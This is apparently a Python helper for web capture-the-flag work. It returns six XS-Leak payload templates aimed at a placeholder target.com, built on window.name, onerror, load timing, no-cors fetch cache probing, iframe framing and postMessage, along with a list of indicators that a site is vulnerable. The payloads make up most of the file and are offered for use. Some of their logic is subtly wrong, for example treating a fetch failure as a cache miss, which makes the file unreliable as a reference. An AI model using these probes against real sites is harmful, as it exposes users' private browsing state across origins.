"""
XS-Leak (Cross-Site Leak) Payload Crafter for Web CTF.
Covers cross-origin information leaks via window.name, error events, timing, and cache probing.
"""

from typing import List, Dict


def get_xs_leak_payloads() -> List[Dict[str, str]]:
    """Generate XS-Leak payloads."""
    return [
        {
            "name": "Window Name Leak",
            "payload": """<script>
// Attacker page sets window.name, then navigates to target
window.name = 'secret_data';
location = 'https://target.com/private';
</script>""",
            "desc": "Leaks data via window.name across origins."
        },
        {
            "name": "Error Event Leak",
            "payload": """<script>
// Detect if a resource exists by checking onerror
var img = new Image();
img.onload = function() { document.title = 'EXISTS'; };
img.onerror = function() { document.title = 'NOT_FOUND'; };
img.src = 'https://target.com/private';
</script>""",
            "desc": "Detects resource existence via onload/onerror."
        },
        {
            "name": "Timing-Based Leak",
            "payload": """<script>
// Detect if a resource is cached by measuring load time
var start = performance.now();
var img = new Image();
img.onload = function() {
    var elapsed = performance.now() - start;
    if (elapsed < 100) { document.title = 'CACHED'; }
    else { document.title = 'NOT_CACHED'; }
};
img.src = 'https://target.com/private';
</script>""",
            "desc": "Detects cached resources via timing."
        },
        {
            "name": "Cache Probing Leak",
            "payload": """<script>
// Probe cache to detect if a user has visited a page
fetch('https://target.com/private', { mode: 'no-cors' })
  .then(() => { document.title = 'CACHED'; })
  .catch(() => { document.title = 'NOT_CACHED'; });
</script>""",
            "desc": "Probes cache to detect visited pages."
        },
        {
            "name": "Frame Counting Leak",
            "payload": """<script>
// Detect if a page can be framed (clickjacking indicator)
var iframe = document.createElement('iframe');
iframe.src = 'https://target.com/private';
iframe.onload = function() { document.title = 'FRAMED'; };
document.body.appendChild(iframe);
</script>""",
            "desc": "Detects if a page can be framed."
        },
        {
            "name": "PostMessage Leak",
            "payload": """<script>
// Listen for postMessage from target
window.addEventListener('message', function(e) {
    document.title = 'MESSAGE: ' + e.data;
});
</script>""",
            "desc": "Leaks data via postMessage."
        }
    ]


def get_xs_leak_indicators() -> List[Dict[str, str]]:
    """Indicators that XS-Leak is possible."""
    return [
        {
            "indicator": "Cross-origin resource access",
            "desc": "If the app allows cross-origin resource loading without restrictions."
        },
        {
            "indicator": "No COOP/COEP headers",
            "desc": "If the app lacks Cross-Origin-Opener-Policy / Embedder-Policy."
        },
        {
            "indicator": "Cacheable sensitive pages",
            "desc": "If sensitive pages are cached and cacheable cross-origin."
        }
    ]
